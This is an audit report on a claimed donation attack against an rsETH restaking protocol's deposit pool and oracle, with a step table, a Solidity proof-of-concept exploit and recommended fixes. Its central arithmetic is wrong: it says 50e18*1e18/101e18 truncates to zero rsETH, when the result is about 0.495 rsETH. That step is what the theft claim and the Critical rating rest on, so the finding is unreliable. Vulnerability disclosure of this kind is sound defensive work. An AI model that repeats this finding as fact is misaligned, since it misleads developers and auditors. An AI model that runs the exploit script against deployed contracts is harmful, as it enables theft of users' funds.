Audit Report

## Title
Donation Attack via Raw `balanceOf` in `getAssetDistributionData()` Inflates rsETH Price, Enabling Fund Theft - (File: contracts/LRTDepositPool.sol)

## Summary
`LRTDepositPool.getAssetDistributionData()` uses raw `IERC20(asset).balanceOf(address(this))` and `address(this).balance` to measure pool holdings, which flow directly into `LRTOracle._getTotalEthInProtocol()` and ultimately set `rsETHPrice`. Because `LRTDepositPool` has an open `receive()` function and `pricePercentageLimit` defaults to `0` (never initialized in `LRTOracle.initialize()`), an attacker can donate ETH to inflate `rsETHPrice` arbitrarily in a single permissionless `updateRSETHPrice()` call. A subsequent victim depositing with `minRSETHAmountExpected = 0` receives zero rsETH while their ETH accrues entirely to the attacker's existing rsETH position.

## Finding Description

**Root cause 1 — raw balance accounting:**
`getAssetDistributionData()` reads the pool's holdings directly from on-chain balances:

```solidity
// contracts/LRTDepositPool.sol L444
assetLyingInDepositPool = IERC20(asset).balanceOf(address(this));
// contracts/LRTDepositPool.sol L480
ethLyingInDepositPool = address(this).balance;
```

These values propagate through `getTotalAssetDeposits()` → `_getTotalEthInProtocol()` → `_updateRsETHPrice()`:

```solidity
// contracts/LRTOracle.sol L341, L343, L250
uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);
totalETHInProtocol += totalAssetAmt.mulWad(assetER);
// ...
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**Root cause 2 — `pricePercentageLimit` uninitialized:**
`LRTOracle.initialize()` sets only `lrtConfig` and emits an event; `pricePercentageLimit` is never assigned, so it defaults to `0`:

```solidity
// contracts/LRTOracle.sol L64-68
function initialize(address lrtConfigAddr) external initializer {
    UtilLib.checkNonZeroAddress(lrtConfigAddr);
    lrtConfig = ILRTConfig(lrtConfigAddr);
    emit UpdatedLRTConfig(lrtConfigAddr);
}
```

The guard at L256–257 is therefore permanently disabled:

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```

With `pricePercentageLimit == 0`, `isPriceIncreaseOffLimit` is always `false`, and any unprivileged caller can commit an arbitrarily large price increase via the public `updateRSETHPrice()`.

**Root cause 3 — zero-rsETH deposit accepted:**
`_beforeDeposit()` only checks `rsethAmountToMint < minRSETHAmountExpected`; when both are `0` the check passes silently:

```solidity
// contracts/LRTDepositPool.sol L667-669
rsethAmountToMint = getRsETHAmountToMint(asset, depositAmount);
if (rsethAmountToMint < minRSETHAmountExpected) {
    revert MinimumAmountToReceiveNotMet();
}
```

`RSETH.mint(victim, 0)` succeeds: the `checkDailyMintLimit(0)` modifier evaluates `currentPeriodMintedAmount + 0 > maxMintAmountPerDay` as false, and OpenZeppelin `_mint` with amount `0` does not revert.

**Full exploit path:**

| Step | Action | rsETH Supply | Pool ETH | rsETH Price |
|------|--------|-------------|----------|-------------|
| 1 | Attacker deposits 1 ETH → 1 rsETH | 1 | 1 ETH | 1 ETH |
| 2 | Attacker sends 100 ETH to `receive()` | 1 | 101 ETH | — |
| 3 | Attacker calls `updateRSETHPrice()` | 1 | 101 ETH | ~101 ETH |
| 4 | Victim deposits 50 ETH, `minRSETHAmountExpected=0` → `50e18/101e18 = 0` rsETH | 1 | 151 ETH | — |
| 5 | Attacker calls `updateRSETHPrice()` | 1 | 151 ETH | ~151 ETH |
| 6 | Attacker calls `initiateWithdrawal(ETH, 1e18)` → `getExpectedAssetAmount = 1e18 * 151e18 / 1e18 = 151 ETH` | 0 | 0 | — |

Attacker net gain: `151 − 1 − 100 = 50 ETH` (victim's entire deposit).

## Impact Explanation

**Critical — Direct theft of user funds.**

The victim deposits 50 ETH and receives 0 rsETH. They hold no claim on the protocol. The attacker's 1 rsETH, which represented 1 ETH before the attack, now represents 151 ETH. The victim's 50 ETH is permanently transferred to the attacker upon withdrawal. This matches the allowed impact: *"Direct theft of any user funds, whether at-rest or in-motion."*

## Likelihood Explanation

Two conditions must hold:

1. **`pricePercentageLimit == 0`**: This is the default state of every deployed or upgraded `LRTOracle` instance. `initialize()` never sets it; an admin must explicitly call `setPricePercentageLimit()` to enable the guard. At protocol launch or after any upgrade, this protection is absent.

2. **Victim passes `minRSETHAmountExpected = 0`**: This is a common pattern — users interacting directly with the contract, frontends that omit slippage protection, or integrators that pass `0` as a default. The protocol accepts this value without any additional safeguard.

Both conditions are realistic, particularly at deployment or post-upgrade before admin configuration.

## Recommendation

1. **Initialize `pricePercentageLimit` to a safe non-zero value** in `LRTOracle.initialize()` (e.g., `1e16` for 1%) so the guard is active from the first block.

2. **Replace raw `balanceOf` with internal accounting** in `getAssetDistributionData()` and `getETHDistributionData()`. Maintain a `totalDepositedAsset[asset]` variable incremented only on legitimate deposits and decremented on withdrawals, analogous to `feeEarnedInETH` elsewhere in the protocol.

3. **Enforce `rsethAmountToMint > 0`** in `_beforeDeposit()` unconditionally, preventing any deposit from resulting in zero rsETH regardless of the `minRSETHAmountExpected` parameter.

## Proof of Concept

```solidity
// Preconditions:
//   - pricePercentageLimit == 0 (default, never set in initialize())
//   - Attacker holds 1 rsETH from depositing 1 ETH

// Step 1: Donate 100 ETH directly — no function call needed, receive() accepts it
(bool ok,) = address(lrtDepositPool).call{value: 100 ether}("");
require(ok);

// Step 2: Commit inflated price — permissionless, pricePercentageLimit==0 means no revert
lrtOracle.updateRSETHPrice();
// rsETHPrice ≈ 101e18

// Step 3: Victim deposits 50 ETH with no slippage guard
// getRsETHAmountToMint: (50e18 * 1e18) / 101e18 = 0 (integer truncation)
// _beforeDeposit: 0 < 0 == false → no revert
// RSETH.mint(victim, 0) → succeeds
lrtDepositPool.depositETH{value: 50 ether}(0, "");
// Victim receives 0 rsETH; 50 ETH enters pool

// Step 4: Update price to reflect victim's ETH
lrtOracle.updateRSETHPrice();
// rsETHPrice ≈ 151e18

// Step 5: Attacker initiates withdrawal of 1 rsETH
// getExpectedAssetAmount(ETH, 1e18) = 1e18 * 151e18 / 1e18 = 151 ETH
lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, 1e18, "");
// After withdrawalDelayBlocks, attacker completes withdrawal and receives 151 ETH
// Net profit: 151 - 1 - 100 = 50 ETH
```
